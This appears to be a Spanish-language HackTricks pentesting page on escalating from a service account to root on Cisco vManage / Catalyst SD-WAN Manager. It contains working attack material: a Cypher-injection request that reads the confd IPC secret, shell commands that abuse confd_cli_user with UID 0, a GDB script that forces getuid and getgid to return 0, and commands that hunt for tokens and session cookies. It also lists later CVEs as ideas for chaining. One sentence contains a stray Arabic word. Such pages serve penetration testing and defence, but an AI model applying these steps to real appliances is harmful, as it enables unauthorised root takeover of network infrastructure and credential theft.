# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una vez que tienes ejecución de código en Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` o `vmanage-admin`, las superficies locales más interesantes para privesc suelen ser la pila CLI de `confd`, el helper `cmdptywrapper`, las APIs REST en localhost y los handlers de import/upload propiedad de root.

Si todavía necesitas el **initial foothold** en un controller, revisa primero la página dedicada al control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Si `/etc/confd/confd_ipc_secret` es legible desde tu foothold, Path 1 y Path 2 se vuelven inmediatamente prácticos.

## Path 1

(Ejemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Después de investigar un poco en cierta [documentación](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los distintos binaries (accesible con una cuenta en el sitio web de Cisco), encontramos que para autenticar el socket IPC, usa un secret ubicado en `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
¿Recuerdas nuestra instancia de Neo4j? Está ejecutándose con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo usando la vulnerabilidad anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
El programa `confd_cli` no soporta argumentos de línea de comandos pero llama a `/usr/bin/confd_cli_user` con argumentos. Así que podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo desde el rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Ejemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

El blog¹ del equipo synacktiv describía una forma elegante de obtener una root shell, pero la salvedad es que requiere conseguir una copia de `/usr/bin/confd_cli_user`, que solo puede ser leída por root. Encontré otra manera de escalar a root sin tanta complicación.

Cuando desensamblé el binario `/usr/bin/confd_cli`, observé lo siguiente:

<details>
<summary>Objdump mostrando la recolección de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Cuando ejecuté “ps aux”, observé lo siguiente (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Hipoteticé que el programa “confd_cli” pasa el ID de usuario y el ID de grupo que recopiló del usuario autenticado a la aplicación “cmdptywrapper”.

Mi primer intento fue ejecutar “cmdptywrapper” directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún punto del proceso y no puedo falsificarlo.

Como se mencionó en el blog de synacktiv(último ejemplo), el programa “confd_cli” no admite argumentos de línea de comandos, pero puedo influir en él con un debugger y, por suerte, GDB está incluido en el sistema.

Creé un script de GDB en el que forcé a la API `getuid` y `getgid` a devolver 0. Como ya tengo privilegio “vmanage” a través del deserialization RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Salida de la consola</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco más tarde documentó una ruta local más limpia hacia root en su propio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **atacante autenticado con solo privilegios de solo lectura** podía enviar una request manipulada al manager CLI y saltar a root debido a una validación de input insuficiente.

Desde una perspectiva ofensiva, esta es la conclusión importante:

1. Una vez que tienes *cualquier* foothold de bajos privilegios en la máquina, deberías probar el servicio local de CLI antes de ir por el flujo más pesado de Path 1 / Path 2.
2. Reutiliza los artefactos de Path 2 para encontrar el trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trata cada campo reenviado al backend de CLI como sospechoso: UID/GID, username, metadata de terminal, archivos importados, o cualquier valor consumido más tarde por un helper propiedad de root.
4. Si un usuario de bajos privilegios puede الوصول al local CLI socket e influir en esos campos, root puede estar a solo una request manipulada de distancia.

Un flujo de trabajo práctico después de aterrizar en el appliance es:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Esto convierte el bug de 2025 en un buen patrón de hunting para versiones similares: busca **local CLI shims que recopilan identidad en userland y la reenvían a un wrapper más privilegiado**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

El advisory de Cisco de febrero de 2026 también introdujo otra clase útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitía a un **authenticated, local attacker with low privileges** obtener root debido a un mecanismo de autenticación de usuario insuficiente en la REST API.

Esto importa porque la privesc en vManage ya no se limita solo al abuso de `confd`/TTY. Después de obtener un shell de bajo privilegio, busca también:

- endpoints de API solo para localhost que confíen demasiado en el caller
- tokens, cookies o credenciales de servicio legibles desde la cuenta actual
- acciones solo para root expuestas a través de handlers `dataservice`/REST que aún pueden activarse localmente

En la práctica, una vez que tienes un shell como `vmanage` u otro usuario de servicio, el abuso local de la API suele ser más silencioso y más fácil de automatizar que el abuso interactivo de la CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si el contexto de la sesión local es suficiente para alcanzar funcionalidad REST privilegiada, prefiere la ruta de la API: es más fácil de reproducir, automatizar y encadenar con sesiones web robadas o tokens de API.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Otro patrón reciente es [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un atacante local con privilegios `netadmin` podría subir un **crafted file** que luego la CLI manejaba de forma insegura, lo que llevaba a command injection como `root`.

Desde el punto de vista de HackTricks, la técnica valiosa es más amplia que el CVE específico:

1. Enumera cada workflow de CLI o web que acepte un archivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Rastrea dónde termina el archivo subido y qué script o binario propiedad de root lo consume.
3. Prueba si el filename, el contenido del archivo o los metadatos parseados se pasan alguna vez a shell commands, wrapper scripts o ayudantes estilo `system()`.
4. Si ya puedes alcanzar `netadmin` (credenciales válidas, sesión robada o una cadena de auth-bypass), los bugs de procesamiento de archivos suelen ser la vía más rápida hacia root.

Esta clase de bug encadena especialmente bien con footholds remotos que otorgan `netadmin` pero no `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – Roba una sesión de admin en la web UI, luego pivota hacia acciones de API/CLI que finalmente llegan a `vshell` o a una de las rutas de privesc locales anteriores.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Muy buen precursor para Path 5 porque `netadmin` es exactamente el nivel requerido por la crafted-file privesc de 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Útil para dejar archivos que luego sean parseados por componentes privilegiados o para sobrescribir artefactos operativos consumidos por ayudantes propiedad de root.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Mejor documentado en la página dedicada de SD-WAN control-plane; puede añadir una SSH key para `vmanage-admin`, dándote el foothold local necesario para volver a esta página.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
